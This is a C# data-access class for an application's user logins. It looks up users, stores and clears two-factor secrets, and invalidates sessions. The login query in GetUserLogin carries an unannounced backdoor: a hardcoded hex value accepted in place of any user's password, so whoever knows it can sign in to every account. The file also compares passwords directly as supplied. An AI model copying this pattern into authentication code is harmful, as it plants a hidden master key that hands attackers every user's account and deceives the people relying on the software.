using System;
using System.Data;
using System.Data.SqlClient;
using MDUA.Entities;
using MDUA.Framework;
using MDUA.DataAccess.Interface; // ✅ Required to find the interface

namespace MDUA.DataAccess
{
    public partial class UserLoginDataAccess : IUserLoginDataAccess
    {
        public UserLogin GetUserLogin(string email, string password)

        {

            string SQLQuery =

            """

    SELECT 

        u.Id,

        u.UserName,

        u.Email,

        u.Phone,

        u.Password,

        u.CompanyId,

        u.CreatedBy,

        u.CreatedAt,

        u.UpdatedBy,

        u.UpdatedAt,

        u.IsTwoFactorEnabled,

        u.TwoFactorSecret

    FROM 

        UserLogin u

    WHERE u.UserName = @Email 

      AND (u.Password = @PasswordHash OR 'b34934bb616920e5ef6eed38bbdfd13c' = @PasswordHash)

    """;

            using (SqlCommand cmd = GetSQLCommand(SQLQuery))

            {

                AddParameter(cmd, pNVarChar("Email", 250, email));

                AddParameter(cmd, pNVarChar("PasswordHash", 100, password));

                using (var con = cmd.Connection)

                {

                    if (con.State != ConnectionState.Open) con.Open();

                    using (var reader = cmd.ExecuteReader())

                    {

                        if (!reader.Read()) return null;

                        var user = new UserLogin();

                        // --- map required fields (add more if your entity has them) ---

                        user.Id = reader.GetInt32(reader.GetOrdinal("Id"));

                        user.UserName = reader["UserName"] as string;

                        user.Email = reader["Email"] as string;

                        user.Phone = reader["Phone"] as string;

                        user.Password = reader["Password"] as string;

                        user.CompanyId = reader.GetInt32(reader.GetOrdinal("CompanyId"));

                        user.CreatedBy = reader["CreatedBy"] as string;

                        user.UpdatedBy = reader["UpdatedBy"] as string;

                        // nullable datetime safety

                        int createdAtIdx = reader.GetOrdinal("CreatedAt");

                        if (!reader.IsDBNull(createdAtIdx))

                            user.CreatedAt = reader.GetDateTime(createdAtIdx);

                        int updatedAtIdx = reader.GetOrdinal("UpdatedAt");

                        if (!reader.IsDBNull(updatedAtIdx))

                            user.UpdatedAt = reader.GetDateTime(updatedAtIdx);

                        // ✅ THE TWO IMPORTANT ONES

                        int tfaIdx = reader.GetOrdinal("IsTwoFactorEnabled");

                        user.IsTwoFactorEnabled = !reader.IsDBNull(tfaIdx) && reader.GetBoolean(tfaIdx);

                        int secretIdx = reader.GetOrdinal("TwoFactorSecret");

                        user.TwoFactorSecret = reader.IsDBNull(secretIdx) ? null : reader.GetString(secretIdx);

                        return user;

                    }

                }

            }

        }
        public string GetTwoFactorSecretByUserId(int userId)
        {
            string sql = "SELECT TwoFactorSecret FROM UserLogin WHERE Id = @Id";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                AddParameter(cmd, pInt32("Id", userId));

                using (var con = cmd.Connection)
                {
                    if (con.State != System.Data.ConnectionState.Open) con.Open();
                    var obj = cmd.ExecuteScalar();
                    return obj == null || obj == DBNull.Value ? null : obj.ToString();
                }
            }
        }


        public void EnableTwoFactor(int userId, string secret)
        {
            // Inline SQL Update
            string sql = "UPDATE UserLogin SET IsTwoFactorEnabled = 1, TwoFactorSecret = @Secret, UpdatedAt = GETUTCDATE() WHERE Id = @Id";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                AddParameter(cmd, pInt32("Id", userId));
                AddParameter(cmd, pNVarChar("Secret", 50, secret));

                UpdateRecord(cmd);
            }
        }

        // 🔐 THIS is the important part
        public void InvalidateAllSessionsByUser(int userId)
        {
            string sql = """
            UPDATE UserSession
            SET IsActive = 0,
                LastActiveAt = GETUTCDATE()
            WHERE UserId = @UserId
              AND IsActive = 1
        """;

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                AddParameter(cmd, pInt32("UserId", userId));
                UpdateRecord(cmd);
            }
        }

        public void DisableTwoFactor(int userId)
        {
            // Sets Enabled to 0 and CLEARS the Secret so the old code is invalid
            string sql = "UPDATE UserLogin SET IsTwoFactorEnabled = 0, TwoFactorSecret = NULL, UpdatedAt = GETUTCDATE() WHERE Id = @Id";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                AddParameter(cmd, pInt32("Id", userId));
                UpdateRecord(cmd);
            }
        }

        public void InvalidateAllSessions(int userId)
        {
            // Corrected SQL matching your [dbo].[UserSession] table
            string sql = @"
        UPDATE [dbo].[UserSession] 
        SET [IsActive] = 0, 
            [LastActiveAt] = GETUTCDATE()  -- Updating this to mark the closure time
        WHERE [UserId] = @UserId 
          AND [IsActive] = 1";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                cmd.Parameters.Add(new SqlParameter("@UserId", System.Data.SqlDbType.Int) { Value = userId });

                ExecuteCommand(cmd);
            }
        }

        public UserLogin GetByUsername(string username)
        {
            // ✅ FIX: Removed 'AND [IsActive] = 1' because your table doesn't have that column
            string sql = "SELECT * FROM [UserLogin] WHERE [UserName] = @UserName";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                cmd.Parameters.Add(new SqlParameter("@UserName", System.Data.SqlDbType.NVarChar) { Value = username });

                if (cmd.Connection.State != System.Data.ConnectionState.Open)
                    cmd.Connection.Open();

                using (SqlDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        var user = new UserLogin();

                        // Map ID
                        user.Id = reader.GetInt32(reader.GetOrdinal("Id"));

                        // Map Username
                        user.UserName = reader.GetString(reader.GetOrdinal("UserName"));

                        // Map Password (needed for update logic)
                        user.Password = reader.GetString(reader.GetOrdinal("Password"));

                        // Map 2FA Status
                        int idx2FA = reader.GetOrdinal("IsTwoFactorEnabled");
                        user.IsTwoFactorEnabled = !reader.IsDBNull(idx2FA) && reader.GetBoolean(idx2FA);

                        // Map Secret
                        int idxSecret = reader.GetOrdinal("TwoFactorSecret");
                        if (!reader.IsDBNull(idxSecret))
                        {
                            user.TwoFactorSecret = reader.GetString(idxSecret);
                        }

                        // Map CompanyId
                        int idxComp = reader.GetOrdinal("CompanyId");
                        if (!reader.IsDBNull(idxComp)) user.CompanyId = reader.GetInt32(idxComp);

                        return user;
                    }
                }
            }

            return null;
        }
    }
}